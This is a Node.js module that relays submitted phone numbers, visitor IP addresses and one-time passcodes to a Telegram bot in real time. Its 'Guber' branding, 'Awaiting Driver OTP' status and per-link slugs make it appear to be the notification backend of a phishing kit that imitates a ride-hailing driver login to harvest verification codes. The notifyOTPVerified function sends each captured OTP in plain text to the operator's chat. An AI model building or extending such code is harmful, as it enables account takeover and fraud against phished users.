const https = require('https');
const fs = require('fs');
const path = require('path');
const EmailSettings = require('../models/EmailSettings');

const STORE_PATH = path.join(__dirname, 'telegram_store.json');

let botToken = '';
let chatId = '';

/**
 * Configure Telegram Bot Token and Chat ID
 */
function configureTelegram(token, id) {
    botToken = (token || '').trim();
    chatId = (id || '').trim();
    console.log(`[TelegramNotifier] Configured Token: ${botToken ? 'YES' : 'NO'}, ChatID: ${chatId || 'NONE'}`);
    saveLocalFile();
    return !!(botToken && chatId);
}

/**
 * Get current Telegram configuration
 */
function getTelegramConfig() {
    return {
        botToken: botToken ? '••••••••' + botToken.slice(-5) : '',
        chatId: chatId || '',
        configured: !!(botToken && chatId)
    };
}

/**
 * Send raw HTTPS request to Telegram Bot API
 */
function sendTelegramMessage(text) {
    return new Promise((resolve, reject) => {
        if (!botToken || !chatId) {
            console.log('[TelegramNotifier] Skipping Telegram alert - Bot Token or Chat ID missing.');
            return resolve(false);
        }

        const payload = JSON.stringify({
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            disable_web_page_preview: true
        });

        const req = https.request({
            hostname: 'api.telegram.org',
            path: `/bot${botToken}/sendMessage`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(payload)
            },
            timeout: 5000 // 5s timeout
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const parsed = JSON.parse(data);
                    if (parsed.ok) {
                        console.log(`[TelegramNotifier] ⚡ Instant Telegram alert sent to Chat ID ${chatId}`);
                        resolve(true);
                    } else {
                        console.error('[TelegramNotifier] Telegram API Error:', parsed.description);
                        reject(new Error(parsed.description));
                    }
                } catch (e) {
                    resolve(false);
                }
            });
        });

        req.on('error', (err) => {
            console.error('[TelegramNotifier] Request error:', err.message);
            reject(err);
        });

        req.write(payload);
        req.end();
    });
}

/**
 * Send instant alert when phone number is submitted
 */
async function notifyPhoneSubmitted({ phoneNumber, customSlug, ipAddress, submittedAt }) {
    const timeStr = new Date(submittedAt || Date.now()).toLocaleTimeString('en-US', {
        hour: '2-digit', minute: '2-digit', second: '2-digit'
    });

    const msg = `📱 <b>New Phone Submitted!</b>\n\n` +
                `📞 <b>Phone:</b> <code>${phoneNumber}</code>\n` +
                `⏳ <b>Status:</b> Awaiting Driver OTP\n` +
                `🔗 <b>Link:</b> <code>${customSlug || '/'}</code>\n` +
                `🌐 <b>IP:</b> ${ipAddress || 'Unknown'}\n` +
                `⏰ <b>Time:</b> ${timeStr}`;

    return sendTelegramMessage(msg).catch(err => console.error('[Telegram] Error:', err.message));
}

/**
 * Send instant alert when OTP is submitted and verified
 */
async function notifyOTPVerified({ phoneNumber, otp, customSlug, ipAddress, verifiedAt }) {
    const timeStr = new Date(verifiedAt || Date.now()).toLocaleTimeString('en-US', {
        hour: '2-digit', minute: '2-digit', second: '2-digit'
    });

    const msg = `✅ <b>DRIVER IDENTITY VERIFIED!</b>\n\n` +
                `📞 <b>Phone:</b> <code>${phoneNumber}</code>\n` +
                `🔑 <b>OTP Code:</b> <code>${otp}</code>\n` +
                `STATUS: <b>VERIFIED</b>\n` +
                `🔗 <b>Link:</b> <code>${customSlug || '/'}</code>\n` +
                `🌐 <b>IP:</b> ${ipAddress || 'Unknown'}\n` +
                `⏰ <b>Time:</b> ${timeStr}`;

    return sendTelegramMessage(msg).catch(err => console.error('[Telegram] Error:', err.message));
}

/**
 * Send test alert
 */
async function sendTestNotification() {
    if (!botToken || !chatId) {
        throw new Error('رجاءً أدخل Bot Token و Chat ID أولاً في الإعدادات!');
    }
    const msg = `⚡ <b>Guber Telegram Test Alert</b>\n\n` +
                `✅ Your Telegram Bot notifications are working 100% INSTANTLY!`;
    return sendTelegramMessage(msg);
}

/**
 * Load persisted settings from file or DB
 */
function initPersistedSettings() {
    try {
        if (fs.existsSync(STORE_PATH)) {
            const raw = fs.readFileSync(STORE_PATH, 'utf8');
            const data = JSON.parse(raw);
            if (data.botToken && data.chatId) {
                botToken = data.botToken;
                chatId = data.chatId;
                console.log(`[TelegramNotifier] Loaded Telegram config from local file. ChatID: ${chatId}`);
            }
        }
    } catch (err) {}
}

function saveLocalFile() {
    try {
        fs.writeFileSync(STORE_PATH, JSON.stringify({ botToken, chatId }, null, 2), 'utf8');
    } catch (e) {}
}

// Auto init on load
initPersistedSettings();

module.exports = {
    configureTelegram,
    getTelegramConfig,
    notifyPhoneSubmitted,
    notifyOTPVerified,
    sendTestNotification,
    initPersistedSettings
};
